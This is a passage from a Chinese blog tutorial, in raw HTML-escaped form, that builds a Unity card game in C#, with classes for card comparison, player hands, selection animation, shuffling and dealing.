        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; splits = cardName.Split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;_&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt; (splits[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;])
        {
            &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                cardType &lt;/span&gt;=&lt;span&gt; CardTypes.Hearts;
                cardIndex &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;.Parse(splits[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;]);
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                cardType &lt;/span&gt;=&lt;span&gt; CardTypes.Spades;
                cardIndex &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;.Parse(splits[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;]);
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                cardType &lt;/span&gt;=&lt;span&gt; CardTypes.Diamonds;
                cardIndex &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;.Parse(splits[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;]);
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                cardType &lt;/span&gt;=&lt;span&gt; CardTypes.Clubs;
                cardIndex &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;.Parse(splits[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;]);
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;joker&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                cardType &lt;/span&gt;=&lt;span&gt; CardTypes.Joker;
                cardIndex &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;.Parse(splits[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;]);
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;string&lt;/span&gt;.Format(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;卡牌文件名{0}非法！&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, cardName));
        }
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;卡牌大小比较&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; CompareTo(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; obj)
    {
        CardInfo other &lt;/span&gt;= obj &lt;span&gt;as&lt;/span&gt;&lt;span&gt; CardInfo;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (other == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;比较对象类型非法！&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果当前是大小王&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (cardType ==&lt;span&gt; CardTypes.Joker)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;对方也是大小王&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (other.cardType ==&lt;span&gt; CardTypes.Joker)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; cardIndex.CompareTo(other.cardIndex);
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;对方不是大小王&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果是一般的牌&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;对方是大小王&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (other.cardType ==&lt;span&gt; CardTypes.Joker)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果对方也是一般的牌&lt;/span&gt;
            &lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算牌力&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; thisNewIndex = (cardIndex == &lt;span&gt;1&lt;/span&gt; || cardIndex == &lt;span&gt;2&lt;/span&gt;) ? &lt;span&gt;13&lt;/span&gt; +&lt;span&gt; cardIndex : cardIndex;
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; otherNewIndex = (other.cardIndex == &lt;span&gt;1&lt;/span&gt; || other.cardIndex == &lt;span&gt;2&lt;/span&gt;) ? &lt;span&gt;13&lt;/span&gt; +&lt;span&gt; other.cardIndex : other.cardIndex;

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (thisNewIndex ==&lt;span&gt; otherNewIndex)
                {
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;cardType.CompareTo(other.cardType);
                }

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; thisNewIndex.CompareTo(otherNewIndex);
            }
        }
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;2.Card预制件上，添加Card脚本，主要保存对应CardInfo信息、选中状态，并加载卡牌图片；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('a558112f-a8ad-4b33-a9da-0047d0741452')&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_a558112f-a8ad-4b33-a9da-0047d0741452&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_a558112f-a8ad-4b33-a9da-0047d0741452&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('a558112f-a8ad-4b33-a9da-0047d0741452',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_a558112f-a8ad-4b33-a9da-0047d0741452&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Card : MonoBehaviour
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; Image image;        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;牌的图片&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; CardInfo cardInfo;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;卡牌信息&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; isSelected;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;是否选中&lt;/span&gt;

    &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Awake()
    {
        image &lt;/span&gt;= GetComponent&amp;lt;Image&amp;gt;&lt;span&gt;();
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 初始化图片
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;cardInfo&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; InitImage(CardInfo cardInfo)
    {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.cardInfo =&lt;span&gt; cardInfo;
        image.sprite &lt;/span&gt;= Resources.Load(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Images/Cards/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + cardInfo.cardName, &lt;span&gt;typeof&lt;/span&gt;(Sprite)) &lt;span&gt;as&lt;/span&gt;&lt;span&gt; Sprite;
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 设置选择状态
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; SetSelectState()
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isSelected)
        {
            iTween.MoveTo(gameObject, transform.position &lt;/span&gt;- Vector3.up *&lt;span&gt; 10f, 1f);
        }
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        {
            iTween.MoveTo(gameObject, transform.position &lt;/span&gt;+ Vector3.up *&lt;span&gt; 10f, 1f);
        }

        isSelected &lt;/span&gt;= !&lt;span&gt;isSelected;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;3.考虑玩家分为2种类型，先创建一个公共的基类，实现玩家公共的方法，比如增加一张卡牌、清空所有卡片、排序等；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('6936d30f-8cf0-4160-9e46-9e5c55a90327')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_6936d30f-8cf0-4160-9e46-9e5c55a90327&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_6936d30f-8cf0-4160-9e46-9e5c55a90327&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('6936d30f-8cf0-4160-9e46-9e5c55a90327',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_6936d30f-8cf0-4160-9e46-9e5c55a90327&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Player : MonoBehaviour
{
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;CardInfo&amp;gt; cardInfos = &lt;span&gt;new&lt;/span&gt; List&amp;lt;CardInfo&amp;gt;();  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;个人所持卡牌&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Text cardCoutText;

    &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Start()
    {
        cardCoutText &lt;/span&gt;= transform.Find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;HeapPos/Text&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;).GetComponent&amp;lt;Text&amp;gt;&lt;span&gt;();
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 增加一张卡牌
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;cardName&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AddCard(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; cardName)
    {
        cardInfos.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; CardInfo(cardName));
        cardCoutText.text &lt;/span&gt;=&lt;span&gt; cardInfos.Count.ToString();
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 清空所有卡片
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; DropCards()
    {
        cardInfos.Clear();
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Sort()
    {
        cardInfos.Sort();
        cardInfos.Reverse();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;4.添加第一种玩家（自身玩家）PlayerSelf，继承Player，并挂载到Player0对象上；&lt;/p&gt;
&lt;p&gt;实现整理手牌的逻辑：发牌后，从中间的位置，根据大小依次将牌展开；&lt;/p&gt;
&lt;p&gt;获取牌面点击事件，将牌选中或取消选中；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('55a16181-d0db-4e99-85ea-210599093ed5')&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_55a16181-d0db-4e99-85ea-210599093ed5&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_55a16181-d0db-4e99-85ea-210599093ed5&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('55a16181-d0db-4e99-85ea-210599093ed5',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_55a16181-d0db-4e99-85ea-210599093ed5&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; PlayerSelf : Player
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; GameObject prefab;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;预制件&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt; Transform originPos1; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;牌的初始位置&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; Transform originPos2; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;牌的初始位置&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; List&amp;lt;GameObject&amp;gt;  cards=&lt;span&gt;new&lt;/span&gt; List&amp;lt;GameObject&amp;gt;&lt;span&gt;();

    &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Awake()
    {
        originPos1 &lt;/span&gt;= transform.Find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OriginPos1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        originPos2 &lt;/span&gt;= transform.Find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OriginPos2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;整理手牌&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; GenerateAllCards()
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;排序&lt;/span&gt;
&lt;span&gt;        Sort();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算每张牌的偏移&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; offsetX = originPos2.position.x -&lt;span&gt; originPos1.position.x;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取最左边的起点&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; leftCount = (cardInfos.Count / &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; startPos = originPos1.position + Vector3.left * offsetX *&lt;span&gt; leftCount;

        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; cardInfos.Count; i++&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;生成卡牌&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; card =&lt;span&gt; Instantiate(prefab, originPos1.position, Quaternion.identity, transform);
            card.GetComponent&lt;/span&gt;&amp;lt;RectTransform&amp;gt;().localScale = Vector3.one * &lt;span&gt;0.6f&lt;/span&gt;&lt;span&gt;;
            card.GetComponent&lt;/span&gt;&amp;lt;Card&amp;gt;&lt;span&gt;().InitImage(cardInfos[i]);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; targetPos = startPos + Vector3.right * offsetX *&lt;span&gt; i;
            card.transform.SetAsLastSibling();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;动画移动&lt;/span&gt;
&lt;span&gt;            iTween.MoveTo(card, targetPos, 2f);

            cards.Add(card);
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; DestroyAllCards()
    {
        cards.ForEach(Destroy);
        cards.Clear();
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 点击卡牌处理
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;data&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; CardClick(BaseEventData data)
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;叫牌或出牌阶段才可以选牌&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (CardManager._instance.cardManagerState == CardManagerStates.Bid ||&lt;span&gt;
            CardManager._instance.cardManagerState &lt;/span&gt;==&lt;span&gt; CardManagerStates.Playing)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; eventData = data &lt;span&gt;as&lt;/span&gt;&lt;span&gt; PointerEventData;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (eventData == &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; card = eventData.pointerCurrentRaycast.gameObject.GetComponent&amp;lt;Card&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (card == &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

            card.SetSelectState();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;5.添加另一种玩家（对手玩家）PlayerOther，继承Player，并挂载到Player1，Player2对象上；&lt;/p&gt;
&lt;p&gt;暂时没有实现任何其他功能：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('6cb1f348-3412-4d8d-accf-1bf56ad123a4')&quot; readability=&quot;31&quot;&gt;&lt;img id=&quot;code_img_closed_6cb1f348-3412-4d8d-accf-1bf56ad123a4&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_6cb1f348-3412-4d8d-accf-1bf56ad123a4&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('6cb1f348-3412-4d8d-accf-1bf56ad123a4',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_6cb1f348-3412-4d8d-accf-1bf56ad123a4&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;57&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; PlayerOther : Player
{
   
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;三、实现发牌逻辑&lt;/h3&gt;
&lt;p&gt;在Camera上添加卡牌管理脚本：CardManager&lt;/p&gt;
&lt;p&gt;1.实现洗牌逻辑，这里用生成GUID随机性后排序，达到洗牌的目的；&lt;/p&gt;
&lt;p&gt;2.记录当前发牌回合，每发一张牌，跳转给下一个玩家；&lt;/p&gt;
&lt;p&gt;3.记录当前玩牌回合（将来可能用到），每玩一局，跳转下个玩家开始发牌；&lt;/p&gt;
&lt;p&gt;4.发牌逻辑：&lt;/p&gt;
&lt;p&gt;设置牌堆的显示，动画依次给每位玩家发一张卡牌，发完牌后，隐藏牌堆，并将玩家的卡牌排序并展示；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('5388b442-16bc-467e-99a3-4a96912f01f5')&quot; readability=&quot;35.5&quot;&gt;&lt;img id=&quot;code_img_closed_5388b442-16bc-467e-99a3-4a96912f01f5&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_5388b442-16bc-467e-99a3-4a96912f01f5&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('5388b442-16bc-467e-99a3-4a96912f01f5',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_5388b442-16bc-467e-99a3-4a96912f01f5&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;66&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CardManager : MonoBehaviour
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;float&lt;/span&gt; dealCardSpeed = &lt;span&gt;20&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;发牌速度&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Player[] Players;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;玩家的集合&lt;/span&gt;

    &lt;span&gt;public&lt;/span&gt; GameObject coverPrefab;      &lt;span&gt;//&lt;/span&gt;&lt;span&gt;背面排预制件&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Transform heapPos;           &lt;span&gt;//&lt;/span&gt;&lt;span&gt;牌堆位置&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Transform[] playerHeapPos;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;玩家牌堆位置&lt;/span&gt;


    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; CardManager _instance;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;单例&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; CardManagerStates cardManagerState;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;[] cardNames;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;所有牌集合&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; termStartIndex = &lt;span&gt;0&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;回合开始玩家索引&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; termCurrentIndex = &lt;span&gt;0&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;回合当前玩家索引&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; List&amp;lt;GameObject&amp;gt; covers = &lt;span&gt;new&lt;/span&gt; List&amp;lt;GameObject&amp;gt;();   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;背面卡牌对象，发牌结束后销毁&lt;/span&gt;

    &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Awake()
    {
        _instance &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;

        cardNames &lt;/span&gt;=&lt;span&gt; GetCardNames();
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 洗牌
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ShuffleCards()
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;进入洗牌阶段&lt;/span&gt;
        cardManagerState =&lt;span&gt; CardManagerStates.ShuffleCards;
        cardNames &lt;/span&gt;= cardNames.OrderBy(c =&amp;gt;&lt;span&gt; Guid.NewGuid()).ToArray();
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 发牌
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; IEnumerator DealCards()
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;进入发牌阶段&lt;/span&gt;
        cardManagerState =&lt;span&gt; CardManagerStates.DealCards;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;显示牌堆&lt;/span&gt;
        heapPos.gameObject.SetActive(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        playerHeapPos.ToList().ForEach(s &lt;/span&gt;=&amp;gt; { s.gameObject.SetActive(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;); });

        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; cardName &lt;span&gt;in&lt;/span&gt;&lt;span&gt; cardNames)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;给当前玩家发一张牌&lt;/span&gt;
&lt;span&gt;            Players[termCurrentIndex].AddCard(cardName);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; cover =&lt;span&gt; Instantiate(coverPrefab, heapPos.position, Quaternion.identity, heapPos.transform);
            cover.GetComponent&lt;/span&gt;&amp;lt;RectTransform&amp;gt;().localScale =&lt;span&gt; Vector3.one;
            covers.Add(cover);
            iTween.MoveTo(cover, playerHeapPos[termCurrentIndex].position, &lt;/span&gt;&lt;span&gt;0.3f&lt;/span&gt;&lt;span&gt;);

